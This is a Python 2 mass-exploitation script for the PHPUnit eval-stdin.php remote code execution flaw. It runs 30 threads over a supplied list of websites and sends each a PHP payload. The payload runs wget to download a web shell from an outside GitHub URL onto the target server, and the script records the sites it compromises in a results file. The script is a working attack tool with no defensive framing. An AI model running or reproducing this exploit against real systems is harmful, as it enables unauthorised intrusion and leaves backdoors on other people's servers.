#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import requests, os, sys
from multiprocessing.pool import ThreadPool
G0 = '\033[0;32m'
C1 = '\033[1;36m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
def rce(site):
    try:
        r = requests.Session()
        r.get(site+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data='<?php system("wget https://raw.githubusercontent.com/mrcombet/combet/main/manager.php -O manager.php");?>', headers={'User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'})
        cek = r.get(site+'/vendor/phpunit/phpunit/src/Util/PHP/manager.php', headers={'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'})
        if 'SEA-GHOST MINSHELL' in cek.text:
            print '%s[ %sSuccess %s] %s/vendor/phpunit/phpunit/src/Util/PHP/manager.php'%(W0,G0,W0,site)
            open('results.txt', 'a+').write(site+'/vendor/phpunit/phpunit/src/Util/PHP/manager.php\n')
        else:
            print '%s[ %sFailed Upload %s] %s'%(W0,R0,W0,site)
    except:
        print '%s[ %s403 Forbidden%s] %s'%(W0,R0,W0,site)
        pass
try:
    os.system('cls' if os.name == 'nt' else 'clear')
    print '''%s
    __                               __
   / /  ____ __________ __   _____  / /   PHP unit rce upload shell
  / /  / __ `/ ___/ __ `/ | / / _ \/ /    
 / /__/ /_/ / /  / /_/ /| |/ /  __/ /     
/_____|__,_/_/   \__,_/ |___/\___/_/      
    '''%(C1,W0,C1,W0,C1,W0,C1)
    ThreadPool(30).map(rce,open(sys.argv[1]).read().splitlines())
    print '\n%s[ %sdone %s] success saved in success.txt'%(W0,G0,W0)
except requests.exceptions.ConnectionError:
        exit('%s[%s!%s] Check internet'%(W0,R0,W0))
except IndexError:
        exit('%s[%s!%s] Use : python2 %s listweb.txt'%(W0,R0,W0,sys.argv[0]))
except IOError:
        exit('%s[%s!%s] File does not exist'%(W0,R0,W0))
except KeyboardInterrupt:
        exit('\n%s[%s!%s] Exit'%(W0,R0,W0))
